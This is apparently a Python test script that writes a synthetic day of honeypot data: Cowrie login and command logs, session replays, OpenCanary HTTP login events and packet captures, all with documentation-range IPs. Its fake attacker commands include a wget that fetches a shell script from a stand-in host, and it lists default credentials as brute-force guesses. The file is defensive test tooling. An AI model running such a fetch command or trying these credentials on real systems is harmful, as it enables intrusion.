#!/usr/bin/env python3
"""Make one day of fake honeypot data under ROOT, in the plan section 6 layout.

    python3 tests/make_fake_day.py ROOT [--end EPOCH] [--seed N]

Creates, relative to ROOT:
  home/cowrie/cowrie/var/log/cowrie/cowrie.json            active JSON log (today)
  home/cowrie/cowrie/var/log/cowrie/cowrie.json.YYYY-MM-DD rotated JSON log (yesterday)
  home/cowrie/cowrie/var/log/cowrie/cowrie.log(.YYYY-MM-DD) text logs
  home/cowrie/cowrie/var/lib/cowrie/tty/<hash>             session replays
  var/tmp/opencanary.log                                    OpenCanary JSON events
  var/log/honeypot/pcap/capture.pcapNN.gz                   finished, gzipped ring files
  var/log/honeypot/pcap/capture.pcapNN                      file tcpdump is still writing

Everything is fake: attacker IPs come from the documentation ranges
(203.0.113.0/24, 198.51.100.0/24, RFC 5737) and the honeypot is 10.0.0.4.
File mtimes are spread over the 24 hours before --end (default: now).
"""

import argparse
import datetime as dt
import gzip
import hashlib
import json
import os
import random
import struct
from pathlib import Path

HONEYPOT_IP = "10.0.0.4"
USERS = ["root", "admin", "ubuntu", "pi", "test", "oracle"]
PASSWORDS = ["123456", "password", "admin", "root", "qwerty", "raspberry"]
COMMANDS = [
    "uname -a",
    "cat /proc/cpuinfo",
    "wget http://198.51.100.9/x.sh",
    "ls -la",
    "exit",
]


def fake_ip(rng):
    return rng.choice(["203.0.113.", "198.51.100."]) + str(rng.randint(1, 254))


def iso(t):
    return dt.datetime.fromtimestamp(t, dt.timezone.utc).strftime(
        "%Y-%m-%dT%H:%M:%S.%fZ"
    )


def cowrie_events(rng, start, end, n_sessions):
    events = []
    for _ in range(n_sessions):
        t = rng.uniform(start, end - 120)
        sid = f"{rng.getrandbits(48):012x}"
        ip = fake_ip(rng)
        port = rng.choice([22, 23])
        base = {"session": sid, "src_ip": ip, "sensor": "sentinel-hp"}
        events.append(
            {
                **base,
                "eventid": "cowrie.session.connect",
                "timestamp": iso(t),
                "src_port": rng.randint(1024, 65535),
                "dst_ip": HONEYPOT_IP,
                "dst_port": port + 2200,
                "protocol": "ssh" if port == 22 else "telnet",
            }
        )
        for _ in range(rng.randint(1, 4)):
            t += rng.uniform(0.5, 5)
            events.append(
                {
                    **base,
                    "eventid": "cowrie.login.failed",
                    "timestamp": iso(t),
                    "username": rng.choice(USERS),
                    "password": rng.choice(PASSWORDS),
                }
            )
        if rng.random() < 0.3:
            t += 1
            events.append(
                {
                    **base,
                    "eventid": "cowrie.login.success",
                    "timestamp": iso(t),
                    "username": "root",
                    "password": "admin",
                }
            )
            for cmd in rng.sample(COMMANDS, 3):
                t += rng.uniform(1, 10)
                events.append(
                    {
                        **base,
                        "eventid": "cowrie.command.input",
                        "timestamp": iso(t),
                        "input": cmd,
                    }
                )
        t += rng.uniform(1, 30)
        events.append(
            {
                **base,
                "eventid": "cowrie.session.closed",
                "timestamp": iso(t),
                "duration": 12.3,
            }
        )
    events.sort(key=lambda e: e["timestamp"])
    return events


def write_lines(path, lines, mtime):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("".join(line + "\n" for line in lines))
    os.utime(path, (mtime, mtime))


def cowrie_text(events):
    return [
        f"{e['timestamp']} [{e['eventid']}] {e['src_ip']} session={e['session']}"
        for e in events
    ]


def ip_checksum(header):
    s = sum(struct.unpack("!10H", header))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def packet(src, dst, sport, dport, flags):
    tcp = struct.pack("!HHIIBBHHH", sport, dport, 1000, 0, 5 << 4, flags, 64240, 0, 0)
    ip = struct.pack(
        "!BBHHHBBH4s4s",
        0x45,
        0,
        20 + len(tcp),
        1,
        0,
        64,
        6,
        0,
        bytes(map(int, src.split("."))),
        bytes(map(int, dst.split("."))),
    )
    ip = ip[:10] + struct.pack("!H", ip_checksum(ip)) + ip[12:]
    eth = b"\x00\x0d\x3a\x00\x00\x01" + b"\x12\x34\x56\x78\x9a\xbc" + b"\x08\x00"
    return eth + ip + tcp


def pcap_bytes(rng, start, end, n_packets):
    out = [struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)]  # Ethernet
    for i in range(n_packets):
        t = start + (end - start) * i / max(n_packets - 1, 1)
        ip, dport = fake_ip(rng), rng.choice([22, 23, 80])
        sport = rng.randint(1024, 65535)
        for src, dst, sp, dp, flags in (
            (ip, HONEYPOT_IP, sport, dport, 0x02),
            (HONEYPOT_IP, ip, dport, sport, 0x12),
        ):
            p = packet(src, dst, sp, dp, flags)
            out.append(
                struct.pack("<IIII", int(t), int((t % 1) * 1e6), len(p), len(p)) + p
            )
    return b"".join(out)


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("root")
    ap.add_argument(
        "--end",
        type=float,
        default=None,
        help="epoch end of the fake day (default now)",
    )
    ap.add_argument("--seed", type=int, default=87)
    args = ap.parse_args()

    rng = random.Random(args.seed)
    end = args.end or dt.datetime.now(dt.timezone.utc).timestamp()
    start = end - 86400
    root = Path(args.root)
    cowrie_log = root / "home/cowrie/cowrie/var/log/cowrie"
    tty = root / "home/cowrie/cowrie/var/lib/cowrie/tty"
    pcap_dir = root / "var/log/honeypot/pcap"

    # Cowrie: yesterday's rotated log ends at the day boundary, today's is still active.
    midnight = dt.datetime.fromtimestamp(end, dt.timezone.utc).replace(
        hour=0, minute=0, second=0, microsecond=0
    )
    split = max(start + 3600, min(midnight.timestamp(), end - 3600))
    rotated_day = dt.datetime.fromtimestamp(split - 1, dt.timezone.utc).strftime(
        "%Y-%m-%d"
    )
    old_ev = cowrie_events(rng, start, split, 40)
    new_ev = cowrie_events(rng, split, end - 300, 25)
    write_lines(
        cowrie_log / f"cowrie.json.{rotated_day}",
        [json.dumps(e) for e in old_ev],
        split - 1,
    )
    write_lines(cowrie_log / "cowrie.json", [json.dumps(e) for e in new_ev], end - 300)
    write_lines(
        cowrie_log / f"cowrie.log.{rotated_day}", cowrie_text(old_ev), split - 1
    )
    write_lines(cowrie_log / "cowrie.log", cowrie_text(new_ev), end - 300)

    # Session replays: one per successful login, named by a hash like Cowrie does.
    for e in [e for e in old_ev + new_ev if e["eventid"] == "cowrie.login.success"]:
        body = f"fake tty replay for session {e['session']}\n".encode() * 20
        p = tty / hashlib.sha256(body).hexdigest()
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(body)
        t = (
            dt.datetime.strptime(e["timestamp"], "%Y-%m-%dT%H:%M:%S.%fZ")
            .replace(tzinfo=dt.timezone.utc)
            .timestamp()
        )
        t = min(t + 60, end - 900)  # older than the 10-minute "stable" window
        os.utime(p, (t, t))

    # OpenCanary HTTP login attempts (logtype 3001).
    canary = []
    for _ in range(30):
        t = rng.uniform(start, end - 300)
        canary.append(
            (
                t,
                json.dumps(
                    {
                        "dst_host": HONEYPOT_IP,
                        "dst_port": 80,
                        "logtype": 3001,
                        "local_time": iso(t),
                        "src_host": fake_ip(rng),
                        "src_port": rng.randint(1024, 65535),
                        "logdata": {
                            "USERNAME": rng.choice(USERS),
                            "PASSWORD": rng.choice(PASSWORDS),
                            "PATH": "/index.html",
                            "USERAGENT": "fake-scanner/1.0",
                        },
                    }
                ),
            )
        )
    canary.sort()
    write_lines(root / "var/tmp/opencanary.log", [c for _, c in canary], end - 600)

    # tcpdump ring: 6 finished, gzipped files over the day, plus the one being written.
    pcap_dir.mkdir(parents=True, exist_ok=True)
    n_files = 7
    span = (end - start) / n_files
    for i in range(n_files):
        f_start, f_end = start + i * span, start + (i + 1) * span - 1
        data = pcap_bytes(rng, f_start, f_end, 200)
        if i < n_files - 1:
            p = pcap_dir / f"capture.pcap{i:02d}.gz"
            p.write_bytes(gzip.compress(data, mtime=0))
            os.utime(p, (f_end + 30, f_end + 30))
        else:
            p = pcap_dir / f"capture.pcap{i:02d}"
            p.write_bytes(data)
            os.utime(p, (end - 60, end - 60))

    print(f"fake day written under {root} ({iso(start)} to {iso(end)})")


if __name__ == "__main__":
    main()
